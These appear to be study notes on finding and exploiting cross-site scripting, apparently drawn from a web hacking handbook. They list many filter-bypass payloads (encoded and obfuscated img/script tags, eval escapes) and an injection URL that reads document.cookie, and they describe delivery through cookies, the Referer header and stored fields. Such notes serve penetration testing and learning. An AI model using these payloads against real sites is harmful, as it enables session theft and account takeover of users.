# Attacking Users: Cross Site Scripting
- common myth: we can't own web application via XSS
-  but in the right situation, a skillfully exploited XSS vulnerability can lead directly to a complete compromise of application, 

## Varieties of XSS (Cross Site Scripting)
1. Reflected 
2. Stored
3. Dom-Based

 ## Finding and Exploiting Reflected Xss vulnerability
 - submit each 	`alphabetical` string in each entry point
 - identify all location where this string is reflected in the application's response
 - for each reflection, identify the syntactic context in which the reflected data appears
 - submit modified data tailored to the reflection's syntactic context, attempting to introduce arbitrary script into the response
 - if the reflected data is blocked or sanitized, preventing your script from executing, try to understand and circumvent the application's defensive filters

## Probing Defensive Filters
# XSS with CSS:
```css
<x style=behavior:url(#default#time2) onbegin=alert(1)>
```

### Space Following Tag Name
```jd
<img/onerror=alert(1) src=a>
<img[%09]onerror=alert(1) src=a>
<img[%0d]onerror=alert(1) src=a>
<img[%0a]onerror=alert(1) src=a>
<img/”onerror=alert(1) src=a>
<img/’onerror=alert(1) src=a>
<img/anyjunk/onerror=alert(1) src=a>
<script/anyjunk>alert(1)</script>
```
### Attribute Names
``<img o[%00]nerror=alert(1) src=a>``
### Attribute Delimeters
```js
<img<img<imgonerror=”alert(1)”src=a>
onerror=’alert(1)’src=a>
onerror=`alert(1)`src=a>
<img src=`a`onerror=alert(1)>
<img/onerror=”alert(1)”src=a>
```
### attribute Value
```js
<img onerror=a[%00]lert(1) src=a>
<img onerror=a&#x6c;ert(1) src=a>
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
<img onerror=a&#x06c;ert(1) src=a>
<img onerror=a&#x006c;ert(1) src=a>
<img onerror=a&#x0006c;ert(1) src=a>
<img onerror=a&#108;ert(1) src=a>
<img onerror=a&#0108;ert(1) src=a>
<img onerror=a&#108ert(1) src=a>
<img onerror=a&#0108ert(1) src=a>
```
### Tag Brackets
```js
%253cimg%20onerror=alert(1)%20src=a%253e
<<script>alert(1);//<</script>
```
## Javascript Filter
```js
<script>eval(‘a\u006cert(1)’);</script>
<script>eval(‘a\x6cert(1)’);</script>
<script>eval(‘a\154ert(1)’);</script>

we use next this to exectute upper code
<script>eval(‘a\l\ert\(1\)’);</script>
```

**TIP:** if we inject into a script but can use quotation marks, because these are being escaped, we can use `String.fromCharCode` technique to construct strings without the need for delimiters

```js
<a href=”#” onclick=”var a = ‘foo’; 
foo&apos;; alert(1);//
```

### eg. bypass Length Limit
page request:
``https://wahh-app.com/account.php?page_id=244&seed=129402931&mode=normal``
and return this
```js
<input type=”hidden” name=”page_id” value=”244”>
<input type=”hidden” name=”seed” value=”129402931”>
<input type=”hidden” name=”mode” value=”normal”>
```
we exploit Xss using
```js
https://myapp.com/account.php?page_id=”><script>/*&seed=*/alert(document.cookie);/*&mode=*/</script>
```
here other variable are comment out

`window.history.pushState()` spoof/change window location

## Exploiting XSS Via Cookies
- use CSRF to assign Custom Cookie then exploit Xss if it is vulnerable
- modify request method, application may allow to use URL parameter with same name as Cookie to trigger xss

## Exploiting Xss in Referer Header
- Some applications contain reflected XSS vulnerabilities that can only be triggered via the Referer header. These are typically fairly easy to exploit using a web server controlled by the attacker. The victim is induced to request a URL on the attacker’s server that contains a suitable XSS payload for the vulnerable application. The attacker’s server returns a response that causes a request to the vulnerable URL, and the attacker’s payload is included in the Referer header that is sent with this request.

# Finding and Exploiting Stored Xss
-  probe every field that store the user data in the server 
-  also check if any Out-Of-Band channels may activate our payload
-  if application allow upload and download file, probe for that too
-  think inmaginatively about any possible means of which data we control may be stored by application and displayed to other users.
	-  eg. comment box, username, 

**TIP:** when probing for Stored Xss try to put all payload different from each other so we know , which is stored and where it is reflecting in the application

## Testing for XSS in Web Mail Applications
## Testing For Xss In Uploaded Files
## uploading Hybrid Files
